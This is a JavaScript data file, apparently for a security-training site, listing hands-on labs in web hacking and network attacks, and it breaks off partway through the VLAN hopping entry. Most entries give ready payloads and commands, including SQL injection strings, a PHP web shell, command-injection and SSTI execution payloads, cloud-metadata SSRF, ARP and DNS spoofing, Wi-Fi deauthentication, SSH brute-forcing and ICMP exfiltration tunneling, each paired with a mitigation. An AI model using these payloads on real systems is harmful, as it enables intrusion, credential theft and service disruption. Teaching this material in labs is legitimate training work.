export const projectsData = [
    // Web Hacking (1-17)
    {
        id: 1,
        title: "SQL Injection on Login Form",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2-3 Hours",
        xp: 50,
        description: "Bypass an authentication form using SQL payload injections and extract hidden administrative table records.",
        guide: {
            objective: "Bypass authentication checks on a login form using SQL injection payloads.",
            labSetup: "Deploy a vulnerable web app (e.g. DVWA, WebGoat) or setup a local Node.js app with an unparameterized SQL query.",
            steps: [
                "Locate the input fields for Username and Password on the login page.",
                "Input a single quote (') into the Username field to see if it generates a database error.",
                "Inject the classic payload: admin' OR '1'='1 in the username field with any password.",
                "Verify access is granted to the administrative dashboard without knowing the secret password."
            ],
            commands: "SQL Username Payload:\nadmin' OR '1'='1\nadmin' --\n' UNION SELECT NULL, username, password FROM users --",
            mitigation: "Use parameterized queries (prepared statements) and ORM libraries. Never concatenate user input directly into SQL execution strings."
        }
    },
    {
        id: 2,
        title: "Stored XSS in Comments Section",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Inject malicious Javascript payloads into a database-stored comment section to hijack browser sessions.",
        guide: {
            objective: "Execute arbitrary Javascript in the browser of other users visiting the comments page.",
            labSetup: "Vulnerable comments guestbook page or mock site with a comment posting form.",
            steps: [
                "Locate the text area for posting public comments.",
                "Submit a test comment containing basic HTML tags (e.g., <b>test</b>) to see if they are rendered.",
                "Inject a script tag: <script>alert(document.cookie)</script>.",
                "Refresh the page to verify if the alert box triggers on every page view, indicating successful stored script execution."
            ],
            commands: "Stored XSS Payloads:\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert('StoredXSS')>",
            mitigation: "Sanitize and escape all user outputs before rendering. Implement a Content Security Policy (CSP) and use HttpOnly flags for cookies."
        }
    },
    {
        id: 3,
        title: "Reflected XSS via URL Parameter",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Exploit search boxes or echo parameters that print user input back to the browser without sanitization.",
        guide: {
            objective: "Trigger reflected scripting by sending a crafted URL with malicious parameters to a user.",
            labSetup: "Web application displaying 'Search results for: [user input]' using URL query strings.",
            steps: [
                "Identify search fields or query parameters in the URL (e.g., ?q=test).",
                "Substitute the search query with: <script>alert('Reflected')</script>.",
                "Execute the request and inspect if the browser interprets the script tag.",
                "Verify if the script executes immediately and only for that specific request lifecycle."
            ],
            commands: "Reflected XSS URL Example:\nhttp://target.local/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E",
            mitigation: "Encode output contextually (HTML entity encoding). Sanitize URL query parameters using robust validation libraries."
        }
    },
    {
        id: 4,
        title: "LFI: Local File Inclusion",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Manipulate file path parameters to access sensitive OS documents like /etc/passwd or win.ini.",
        guide: {
            objective: "Retrieve system configurations by exploiting vulnerabilities in parameter file inclusion.",
            labSetup: "PHP web application utilizing standard file loading scripts (e.g., include($_GET['page'])).",
            steps: [
                "Find URL parameters loading dynamic pages (e.g., index.php?page=welcome.php).",
                "Attempt to traverse directory paths using directory delimiters: ../../../etc/passwd.",
                "Examine response data for files that are outside the web document root directory.",
                "Experiment with PHP filter wrappers to read source code (e.g., php://filter/convert.base64-encode/resource=index)."
            ],
            commands: "LFI Traversal Payloads:\n?page=../../../../etc/passwd\n?page=../../../../windows/win.ini\n?page=php://filter/convert.base64-encode/resource=config.php",
            mitigation: "Avoid user-supplied input inside file paths. Implement strict whitelists of allowed page variables instead of dynamic inclusions."
        }
    },
    {
        id: 5,
        title: "RCE via File Upload Bypass",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Upload a malicious web shell by bypassing client-side extension filters, then run remote terminal console commands.",
        guide: {
            objective: "Upload a script (PHP/ASP) and execute system commands remotely in the server environment.",
            labSetup: "Web page offering file uploads (e.g., profile avatars) with weak validation checks.",
            steps: [
                "Create a simple PHP web shell file (e.g., shell.php) containing system execution logic.",
                "Attempt to upload it and note any file extension blocks.",
                "Bypass block mechanisms using extension manipulation (e.g., shell.php5, shell.phtml) or null-bytes.",
                "Intercept requests with Burp Suite to alter content-type headers to image/jpeg.",
                "Access the uploaded file directory via browser and input command queries (e.g., ?cmd=whoami)."
            ],
            commands: "Simple PHP Shell:\n<?php echo shell_exec($_GET['cmd']); ?>\n\nCommand execution trigger:\nhttp://target.local/uploads/shell.php?cmd=cat%20/etc/passwd",
            mitigation: "Store uploaded documents outside the webroot. Generate randomized file names, restrict executions, and use secure static server directories."
        }
    },
    {
        id: 6,
        title: "IDOR on User Profile API",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Modify user ID parameters inside request payloads to view or update private details of other accounts.",
        guide: {
            objective: "Gain unauthorized access to user profile pages by altering numeric identifiers.",
            labSetup: "Web app dashboard loading settings from an API using queries like /api/v1/user/1001.",
            steps: [
                "Log into the application and locate the account profile page.",
                "Capture profile requests in Burp Suite and locate parameters containing ID digits.",
                "Manually increment or decrement the ID (e.g., changing 1001 to 1002).",
                "Verify if the server sends back data belonging to another user without checking authentication."
            ],
            commands: "IDOR Intercept:\nGET /api/v1/users/1002 HTTP/1.1\nHost: target.local\nAuthorization: Bearer [User_1001_Token]",
            mitigation: "Implement robust access control checks at the controller level. Use non-sequential UUIDs instead of predictable numeric IDs."
        }
    },
    {
        id: 7,
        title: "CSRF Password Reset Exploit",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Forge an HTTP request that forces authenticated victim profiles to change credentials when visiting a malicious page.",
        guide: {
            objective: "Perform actions on behalf of another logged-in user without their knowledge or consent.",
            labSetup: "A password update panel that doesn't use anti-CSRF tokens or double-submit cookies.",
            steps: [
                "Locate the form for modifying passwords or email addresses.",
                "Capture form requests with Burp Suite and check for unique security tokens.",
                "Create a malicious HTML file with a self-submitting form targeting the update endpoint.",
                "Load the malicious file in a browser session where the target user is logged in, verifying if their password updates automatically."
            ],
            commands: "CSRF PoC Form:\n<form id='csrf' action='http://target.local/update' method='POST'>\n  <input type='hidden' name='password' value='hacked'>\n</form>\n<script>document.getElementById('csrf').submit();</script>",
            mitigation: "Add unique, cryptographically secure anti-CSRF tokens to all POST forms, or implement SameSite=Strict cookie properties."
        }
    },
    {
        id: 8,
        title: "SSRF on Cloud Metadata Endpoint",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Abuse URL validation parameters to force backend servers to query internal metadata APIs and leak credentials.",
        guide: {
            objective: "Read internal server APIs or AWS metadata structures by exploiting import/fetching parameters.",
            labSetup: "A PDF generator or URL fetch form that downloads files from user-defined addresses.",
            steps: [
                "Find fields asking for URL parameters (e.g. ?url=http://example.com/logo.png).",
                "Change the parameter address to target local host services: http://localhost:80/ or http://127.0.0.1/.",
                "Query cloud provider metadata endpoints, specifically: http://169.254.169.254/latest/meta-data/.",
                "Extract IAM credentials, keys, and security groups from the HTTP response structure."
            ],
            commands: "SSRF AWS Query:\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n?url=http://127.0.0.1:8080/admin",
            mitigation: "Validate and whitelist destination domains. Avoid fetching direct client URL parameters; place internal APIs on separate isolated network segments."
        }
    },
    {
        id: 9,
        title: "XML External Entity (XXE) Injection",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Inject custom XML entity definitions into input fields to load file contents or ping external target ports.",
        guide: {
            objective: "Retrieve system configurations and exploit file processing using malicious XML payloads.",
            labSetup: "An API endpoint accepting XML format inputs (e.g., SOAP service, content uploads) without checking external system variables.",
            steps: [
                "Capture an API post containing XML structures in its payload body.",
                "Insert a custom DOCTYPE definition containing an external entity mapping to a local system file.",
                "Reference the defined entity in the XML data payload tag.",
                "Verify if system files (e.g. /etc/passwd) are printed back inside API responses."
            ],
            commands: "XXE Payload:\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&xxe;</username><password>pass</password></user>",
            mitigation: "Disable External Entity Resolution (DTD/external entities processing) in the XML parser configuration settings."
        }
    },
    {
        id: 10,
        title: "Directory Traversal Vulnerability Lab",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Browse files and directories outside webroot spaces using path manipulation tricks.",
        guide: {
            objective: "Access folders containing source code or credentials using relative page pathing links.",
            labSetup: "A static file delivery page using query parameters, like /download.php?file=report.pdf.",
            steps: [
                "Inspect file download parameters in URL query links.",
                "Insert directory delimiters to back out of directory nodes: download.php?file=../../etc/passwd.",
                "Verify if the server allows reading system documents, bypass filters with URL-encoding (%2e%2e%2f)."
            ],
            commands: "Path Traversal variants:\n?file=....//....//etc/passwd\n?file=%252e%252e%252fetc/passwd",
            mitigation: "Use strict whitelists of files. Strip path traversal symbols dynamically, or map parameters to database indexes."
        }
    },
    {
        id: 11,
        title: "Broken Authentication & Session Hack",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Hijack authentication sessions by exploiting weak cookies, predictable session tokens, or session fixation bugs.",
        guide: {
            objective: "Take control of an active user session using leaked or stolen cookie strings.",
            labSetup: "A application utilizing weak session IDs (e.g. base64-encoded usernames) or lacking session regeneration on login.",
            steps: [
                "Analyze the session cookies stored in the browser (e.g., SessionID=YWRtaW4=).",
                "Decode session strings to detect patterns, like Base64 or MD5 mappings.",
                "Forge custom session cookies for other user accounts (e.g., encoding 'admin' to replace 'guest').",
                "Verify dashboard entry with modified cookies without inputting account passwords."
            ],
            commands: "Decoding session strings:\necho -n 'YWRtaW4=' | base64 --decode\n# output: admin",
            mitigation: "Use secure, cryptographically random, high-entropy session IDs generated by framework engines on every authorization."
        }
    },
    {
        id: 12,
        title: "Clickjacking Attack Site",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Build an invisible iframe overlap page that tricks victims into clicking high-privilege operations.",
        guide: {
            objective: "Force target users to perform unintended actions by overlaying transparent target page containers.",
            labSetup: "A web page performing high-privilege clicks (e.g., delete profile button) lacking iframe display security parameters.",
            steps: [
                "Create a malicious HTML page with an iframe loading the target site.",
                "Style the iframe with absolute positioning and opacity: 0 to make it completely invisible.",
                "Position a decoy element (e.g. 'Click here for free reward' button) directly underneath the target button.",
                "Test if clicking the decoy triggers action processing in the hidden iframe."
            ],
            commands: "Clickjacking CSS:\niframe {\n  position: absolute; width: 500px; height: 500px;\n  opacity: 0; z-index: 2;\n}\nbutton.decoy {\n  position: absolute; z-index: 1;\n}",
            mitigation: "Send X-Frame-Options: DENY headers or implement robust Content Security Policy (CSP) frame-ancestors definitions."
        }
    },
    {
        id: 13,
        title: "Command Injection via Ping Form",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Inject shell execution command separators (e.g. ;, &&) into a network utility tool to run arbitrary OS terminal functions.",
        guide: {
            objective: "Execute arbitrary operating system commands on the hosting server.",
            labSetup: "A web utility page that runs a ping check on an IP address provided in a form input field.",
            steps: [
                "Find inputs that execute shell utilities under the hood (e.g., ping tool).",
                "Input a valid IP followed by command separators: 127.0.0.1; whoami.",
                "Verify if system command execution output is appended to ping response details.",
                "Test other delimiters if shell blocks exist (e.g., |, &, ||, newlines)."
            ],
            commands: "Command Injection Payloads:\n127.0.0.1; cat /etc/passwd\n127.0.0.1 && id\n127.0.0.1 | uname -a",
            mitigation: "Avoid direct command shell execution. Execute APIs using structured system frameworks or sanitize parameter inputs."
        }
    },
    {
        id: 14,
        title: "SSTI in Python Web App",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit server-side template rendering scripts (Jinja2/Mako) to access application contexts and execute commands.",
        guide: {
            objective: "Gain Remote Code Execution by injecting system directives into HTML template fields.",
            labSetup: "A Python Flask web app rendering data using string formatting instead of structured templates.",
            steps: [
                "Locate query fields reflecting user input (e.g., error display messages).",
                "Input dynamic calculation syntax to test parsing: {{7*7}}.",
                "Verify output displays 49, indicating active server-side template processing.",
                "Inject class-navigation variables to access Python subclasses and trigger remote shell commands."
            ],
            commands: "Jinja2 SSTI payloads:\n{{7*7}}\n{{self._TemplateReference__context.namespace}}\n{{''.__class__.__mro__[1].__subclasses__()[117]('whoami',shell=True).check_output()}}",
            mitigation: "Never concatenate strings into template definitions. Render parameters using standard templating mechanisms with sandbox validation."
        }
    },
    {
        id: 15,
        title: "JWT Token Authentication Bypass",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Modify JSON Web Tokens (JWT) using the 'None' algorithm or brute-forced signature keys to hijack session authentication.",
        guide: {
            objective: "Gain administrative session rights by tampering with JWT headers and payloads.",
            labSetup: "A login API authenticating sessions using JWT parameters in headers without key validations.",
            steps: [
                "Locate JWT tokens in browser headers or storage.",
                "Decode headers in a tool and set the signing algorithm 'alg' parameter to 'None'.",
                "Modify user role values in payload sections to 'admin'.",
                "Re-encode JWT without appending signature strings and send authentication requests."
            ],
            commands: "JWT Header alteration:\n{\n  \"alg\": \"None\",\n  \"typ\": \"JWT\"\n}\n\nJWT Payload alteration:\n{\n  \"username\": \"admin\",\n  \"role\": \"admin\"\n}",
            mitigation: "Always validate signature keys. Set strong secrets, and reject token strings stating 'alg':'None' inside authorization headers."
        }
    },
    {
        id: 16,
        title: "CORS Misconfiguration Audit",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit headers to detect wildcard Access-Control-Allow-Origin configs, allowing external domains to read responses.",
        guide: {
            objective: "Extract user data from APIs by hosting a script that exploits open CORS headers.",
            labSetup: "An API dashboard returning user stats with Access-Control-Allow-Origin set dynamically based on Origin request headers.",
            steps: [
                "Send API requests with modified Origin headers: Origin: http://malicious.local.",
                "Inspect responses for Access-Control-Allow-Origin: http://malicious.local.",
                "Check for presence of Access-Control-Allow-Credentials: true.",
                "Create a payload script that queries the endpoint and logs responses to confirm data access."
            ],
            commands: "CORS Audit Request Header:\nGET /api/v1/user HTTP/1.1\nOrigin: http://evil.com\nAccess-Control-Request-Method: GET",
            mitigation: "Avoid implementing wildcard dynamically echoed origin setups. Explicitly map trusted client domains inside CORS configurations."
        }
    },
    {
        id: 17,
        title: "GraphQL Query Abuse Lab",
        category: "web-hacking",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit unprotected GraphQL endpoints using circular nested queries to cause Server Denial of Service (DoS).",
        guide: {
            objective: "Exhaust API backend systems by injecting deep circular queries.",
            labSetup: "An active GraphQL endpoint containing self-referencing relationship schemes.",
            steps: [
                "Locate the GraphQL interface (e.g. /graphql, /graphiql).",
                "Run introspection queries to map existing schema relationships.",
                "Construct circular self-referencing scripts mapping queries (e.g. author -> posts -> author -> posts).",
                "Execute the deep query and monitor API loading times to verify service degradation."
            ],
            commands: "Circular GraphQL payload:\nquery DoS {\n  author {\n    posts {\n      author {\n        posts { id }\n      }\n    }\n  }\n}",
            mitigation: "Disable schema introspection in production environments. Implement query depth-limiting and query cost validation."
        }
    },

    // Network Security (18-34)
    {
        id: 18,
        title: "Packet Sniffing with Wireshark",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Capture and analyze unencrypted cleartext passwords, email details, and protocols from active network adapters.",
        guide: {
            objective: "Monitor network adapters and extract credentials from unencrypted protocol packets.",
            labSetup: "Install Wireshark locally and set up a basic target client sending HTTP/FTP requests.",
            steps: [
                "Start Wireshark and select your primary active network interface card.",
                "Click the capture button and filter packets by protocol: http.",
                "Generate some test traffic by accessing an unencrypted login form on a HTTP website.",
                "Stop the capture and use 'Follow HTTP Stream' to view submitted username and password strings."
            ],
            commands: "Wireshark Display Filters:\nhttp\nhttp.request.method === \"POST\"\nftp || telnet",
            mitigation: "Enforce TLS/SSL encryption globally. Deprecate legacy cleartext protocols (HTTP, FTP, Telnet) in favor of HTTPS, SFTP, and SSH."
        }
    },
    {
        id: 19,
        title: "ARP Spoofing Hacking Demo",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Perform a Man-in-the-Middle (MitM) attack by poisoning ARP tables to intercept traffic between local clients.",
        guide: {
            objective: "Redirect traffic from a target host through your machine using forged ARP packets.",
            labSetup: "An isolated subnet with three systems (Victim client, Target Gateway, Attacker machine).",
            steps: [
                "Turn on IP forwarding on the attacker machine to prevent network disruptions.",
                "Identify client and gateway IP addresses using network sweeps.",
                "Run arpspoof to poison target system ARP tables, masquerading as the router.",
                "Run arpspoof targeting the router, masquerading as the victim, and inspect the incoming packet flows."
            ],
            commands: "Enable IP Forwarding:\nsudo sysctl -w net.ipv4.ip_forward=1\n\nPoison Target Client:\nsudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]\nsudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]",
            mitigation: "Implement static ARP tables on high-value systems, enforce dynamic ARP inspection (DAI) on switches, and encrypt all application layer traffic."
        }
    },
    {
        id: 20,
        title: "DNS Spoofing with Ettercap",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Redirect web traffic requests from domain names to malicious attacker-controlled IP addresses on the local network.",
        guide: {
            objective: "Hijack network queries and resolve standard host domains to local mock-up servers.",
            labSetup: "Install Ettercap on Kali Linux and prepare a mock web server on the local subnet.",
            steps: [
                "Configure Ettercap's plugin file (etter.dns) mapping target domains to your mock server IP.",
                "Select targets (Gateway and Victim Client) in Ettercap.",
                "Launch ARP poison spoofing to place your system in-path.",
                "Activate the dns_spoof plugin and check if visiting target sites redirects the client to your server."
            ],
            commands: "Ettercap launch GUI:\nsudo ettercap -G\n\nEttercap CLI trigger:\nsudo ettercap -T -q -P dns_spoof -M arp /[Victim_IP]/ /[Gateway_IP]/",
            mitigation: "Use encrypted DNS services (DNS over HTTPS/TLS) and DNSSEC. Configure firewalls to block rogue DNS responses."
        }
    },
    {
        id: 21,
        title: "Rogue DHCP Server Setup",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Deploy a rogue DHCP server that leases custom gateway and DNS settings to local network clients.",
        guide: {
            objective: "Deploy an attacker-controlled DHCP lease engine to capture data flows.",
            labSetup: "An isolated network space containing test client targets requesting IP parameters.",
            steps: [
                "Configure a local DHCP service setup (e.g. dnsmasq) stating gateway and DNS parameters matching your host IP.",
                "Initiate DHCP starvation checks to consume active server IP leases.",
                "Launch the rogue DHCP service on your local network port.",
                "Inspect system parameters of connecting clients to verify configuration takeovers."
            ],
            commands: "dnsmasq Rogue configuration:\ninterface=eth0\ndhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h\ndhcp-option=option:router,[Attacker_IP]\ndhcp-option=option:dns-server,[Attacker_IP]",
            mitigation: "Implement DHCP Snooping on local network switches. Disable rogue ports and check configuration mappings."
        }
    },
    {
        id: 22,
        title: "Nmap Port Scanning",
        category: "network-sec",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Scan network targets to discover active services, open ports, firewall parameters, and operating system information.",
        guide: {
            objective: "Perform reconnaissance on system targets using Nmap scans.",
            labSetup: "Host targets locally (e.g. Metasploitable VM) or use allowed network sandboxes.",
            steps: [
                "Scan targets using basic ping sweep configurations to find active systems.",
                "Initiate target checks using standard TCP SYN scans (-sS).",
                "Activate version tracking and OS detection tools (-A).",
                "Inspect scan outputs to map potential service exploits."
            ],
            commands: "Network sweep scan:\nnmap -sn 192.168.1.0/24\n\nFull aggressive vulnerability port check:\nnmap -sS -sV -O -A [Target_IP]\n\nScript scan for vulnerabilities:\nnmap --script vuln [Target_IP]",
            mitigation: "Disable unnecessary ports and services. Deploy firewalls, block ping checks, and use intrusion detection systems (IDS)."
        }
    },
    {
        id: 23,
        title: "Firewall Evasion Mechanics",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Use packet fragmentation, decoy IPs, and source port manipulation to bypass target security firewalls.",
        guide: {
            objective: "Complete reconnaissance scans bypassing local firewall detection rules.",
            labSetup: "A network target protected by basic system firewalls blocking standard Nmap scans.",
            steps: [
                "Scan the firewall target using port checks and verify if packets are dropped.",
                "Execute scans using Nmap fragmentation properties (-f) to split up packet headers.",
                "Test scanning using spoofed source ports commonly allowed by firewalls (e.g., port 53 or 80).",
                "Apply decoy scanning IP parameters (-D) to mask search origins."
            ],
            commands: "Scan with fragmented packets:\nnmap -f [Target_IP]\n\nDecoy scanning with specific source port:\nnmap -g 53 -D RND,RND,[Attacker_IP] [Target_IP]",
            mitigation: "Implement stateful inspection firewalls, deploy deep packet analysis, and block unknown source ports."
        }
    },
    {
        id: 24,
        title: "Wi-Fi Deauthentication Attack",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Force wireless clients to disconnect from access points by injecting spoofed deauth management frames.",
        guide: {
            objective: "Disconnect wireless devices from a network target by sending fake deauth packets.",
            labSetup: "An open/WPA2 wireless network, a client device, and an external network card supporting monitor mode.",
            steps: [
                "Place your wireless network card adapter into monitor mode.",
                "Execute airodump-ng sweeps to find targets, channels, and client MACs.",
                "Target a specific wireless router access point and monitor connected clients.",
                "Send deauth packets using aireplay-ng targeting the victim MAC, verifying they disconnect."
            ],
            commands: "Enable Monitor Mode:\nsudo airmon-ng start wlan0\n\nCapture packet details:\nsudo airodump-ng -c [channel] --bssid [Router_MAC] wlan0mon\n\nSend Deauth Frames:\nsudo aireplay-ng --deauth 10 -a [Router_MAC] -c [Victim_MAC] wlan0mon",
            mitigation: "Implement Protected Management Frames (PMF, 802.11w) on the router access point to prevent spoofing."
        }
    },
    {
        id: 25,
        title: "Evil Twin Access Point Lab",
        category: "network-sec",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
        description: "Create a rogue wireless access point with identical SSID configurations to lure clients into connecting and leak data.",
        guide: {
            objective: "Deploy a duplicate wireless SSID network and capture client credentials via captive portals.",
            labSetup: "A system with internet capabilities, a monitor mode Wi-Fi adapter, and mock targets.",
            steps: [
                "Launch a duplicate SSID wireless network using utilities like hostapd or airgeddon.",
                "Deploy a DHCP IP assignment server on the interface to manage clients.",
                "Host a captive login page that redirects HTTP requests to grab inputs.",
                "Verify connecting victim clients input passwords into the web forms."
            ],
            commands: "Create AP with airgeddon GUI:\nsudo airgeddon\n\nDNSMASQ Config file mapping IP routing:\ninterface=at0\ndhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,1h",
            mitigation: "Train users to avoid untrusted public Wi-Fi networks. Enable WPA3 protocols and utilize corporate VPN services."
        }
    },
    {
        id: 26,
        title: "SSH Brute-Forcing using Hydra",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Conduct automated dictionary attacks to find active user credentials on SSH servers.",
        guide: {
            objective: "Audit credential configurations on an SSH port using wordlists.",
            labSetup: "A test server running SSH and a target user account with a weak password.",
            steps: [
                "Identify target system IP and confirm SSH port 22 is open.",
                "Select password dictionaries (e.g. Rockyou text list) and username files.",
                "Configure Hydra with target threads, host details, and input files.",
                "Execute calculations and check for successful login matches."
            ],
            commands: "Hydra SSH attack syntax:\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[Target_IP] -t 4",
            mitigation: "Disable password logins for SSH; use secure key file mappings instead. Install Fail2ban to block IP ranges after repeated failed attempts."
        }
    },
    {
        id: 27,
        title: "FTP Interception via tcpdump",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Capture packet streams on the terminal using tcpdump to extract FTP login details.",
        guide: {
            objective: "Filter raw interface packet streams to capture plain-text user logins.",
            labSetup: "A client system logging into an unencrypted FTP server on the local subnet.",
            steps: [
                "Identify active interfaces on the attacker computer.",
                "Run tcpdump with port 21 filtering logic to inspect port traffic.",
                "Extract packet payloads on the console as raw text strings.",
                "Filter captures specifically for USER and PASS parameters to reveal credentials."
            ],
            commands: "Terminal packet grab:\nsudo tcpdump -i eth0 -A port 21 | grep -E -i 'USER|PASS'",
            mitigation: "Decommission unencrypted FTP connections. Transition to secure file protocols (SFTP / FTPS)."
        }
    },
    {
        id: 28,
        title: "Network Pivoting",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Pivot through compromised systems using SSH tunneling and proxychains to scan internal network nodes.",
        guide: {
            objective: "Tunnel network traffic through a compromised boundary system to scan hidden internal devices.",
            labSetup: "A boundary host connected to two networks: outer internet and internal local subnet.",
            steps: [
                "Establish a dynamic SSH tunnel port to the compromised boundary server.",
                "Configure proxychains (/etc/proxychains.conf) targeting local socks proxy configurations.",
                "Pre-load network commands with proxychains directives (e.g. proxychains nmap).",
                "Verify internal subnet scans execute successfully through the remote tunnel gateway."
            ],
            commands: "Open Dynamic Tunnel:\nssh -N -D 9050 user@[Compromised_IP]\n\nScan through dynamic proxy:\nproxychains nmap -sT -pn [Internal_Subnet_Target]",
            mitigation: "Implement strict network segmentation, enforce endpoint firewalls, and monitor logs for unusual internal connection flows."
        }
    },
    {
        id: 29,
        title: "VPN Tunnel Auditing",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit target VPN portals using ipsec-scan to find active encryption policies and weak handshake formats.",
        guide: {
            objective: "Identify security parameters and weak keys used in IPSec VPN servers.",
            labSetup: "A network endpoint running standard VPN configurations (IPSec/IKEv2).",
            steps: [
                "Run ike-scan to discover open VPN gateways on host ranges.",
                "Examine responses for active encryption profiles and transform payloads.",
                "Test system key handshakes using dictionary lists to uncover weak keys."
            ],
            commands: "VPN Scan with IKE-scan:\nsudo ike-scan -A [Target_IP]\n\nBrute force pre-shared keys:\nikeprobe -s [Target_IP]",
            mitigation: "Disable insecure aggressive negotiation modes in IPSec configurations. Enforce multi-factor authentication (MFA) and strong pre-shared keys."
        }
    },
    {
        id: 30,
        title: "SNMP Trap Vulnerability Scan",
        category: "network-sec",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Scan port 161 with community wordlists to query system logs and network configuration details.",
        guide: {
            objective: "Extract sensitive system variables using SNMP queries with weak community strings.",
            labSetup: "A target device hosting active SNMP services with public/private default access configuration keys.",
            steps: [
                "Identify SNMP ports on target hosts.",
                "Execute Nmap script checks or use onesixtyone to discover active SNMP community keys.",
                "Query target devices using snmpwalk to extract system profiles, adapter details, and routing paths."
            ],
            commands: "SNMP Key discovery scan:\nonesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt [Target_IP]\n\nSNMP Walk Query:\nsnmpwalk -v 2c -c public [Target_IP]",
            mitigation: "Disable SNMP versions 1 and 2c. Enforce SNMPv3 which provides encryption and strong user authentication."
        }
    },
    {
        id: 31,
        title: "SSL Stripping Attack",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Force user browsers to downgrade from HTTPS to unencrypted HTTP using sslstrip during a MitM session.",
        guide: {
            objective: "Capture HTTPS traffic by stripping SSL/TLS layers between users and destinations.",
            labSetup: "An isolated network subnet with a proxy, victim client, and destination gateway.",
            steps: [
                "Initiate ARP spoofing attacks to intercept victim traffic.",
                "Configure iptables to redirect HTTP traffic (port 80) to your sslstrip listening port.",
                "Launch sslstrip to downgrade HTTPS requests on-the-fly.",
                "Monitor raw log files to extract plain-text user login credentials."
            ],
            commands: "Route Port Forwarding:\nsudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\n\nLaunch SSLStrip:\nsslstrip -l 10000",
            mitigation: "Deploy HTTP Strict Transport Security (HSTS) headers globally on web servers. Implement HSTS preloading."
        }
    },
    {
        id: 32,
        title: "MAC Spoofing & Port Security Bypass",
        category: "network-sec",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Bypass switch port security rules by spoofing the MAC address of an authorized network device.",
        guide: {
            objective: "Connect an unauthorized system to a network secured by MAC-address-filtering.",
            labSetup: "A network switch configured with static MAC filtering on client connections.",
            steps: [
                "Inspect the MAC address of an active, authorized network computer.",
                "Temporarily disconnect the target device from the subnet.",
                "Modify your system's network card MAC address using macchanger to match the target device.",
                "Connect your computer to the switch port and verify connection access."
            ],
            commands: "Change MAC Address:\nsudo ip link set dev eth0 down\nsudo macchanger -m [Authorized_MAC] eth0\nsudo ip link set dev eth0 up",
            mitigation: "Deploy 802.1X network access control instead of relying on weak MAC filtering filters."
        }
    },
    {
        id: 33,
        title: "ICMP Tunneling for Data Exfil",
        category: "network-sec",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Exfiltrate data outside target network segments by tunneling traffic inside ICMP echo request packets.",
        guide: {
            objective: "Bypass firewall egress filters by routing commands inside standard ping request wrappers.",
            labSetup: "Two computers: an internal client (blocked from web ports) and an external server accepting ping checks.",
            steps: [
                "Deploy an ICMP tunnel host utility (e.g. ptunnel) on the external target server.",
                "Run the ptunnel client application on the internal compromised machine.",
                "Forward traffic (e.g., SSH sessions) through the established ICMP ping tunnel.",
                "Verify remote terminal command access bypassing TCP/UDP blocks."
            ],
            commands: "Launch Tunnel Server:\nsudo ptunnel -c [Interface]\n\nClient Connection Tunnel:\nsudo ptunnel -p [Server_IP] -lp 8000 -da 127.0.0.1 -dp 22",
            mitigation: "Block or limit outbound ICMP payload sizes. Monitor networks to detect large numbers of ping packets with non-standard payloads."
        }
    },
    {
        id: 34,
        title: "VLAN Hopping Attack",
        category: "network-sec",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
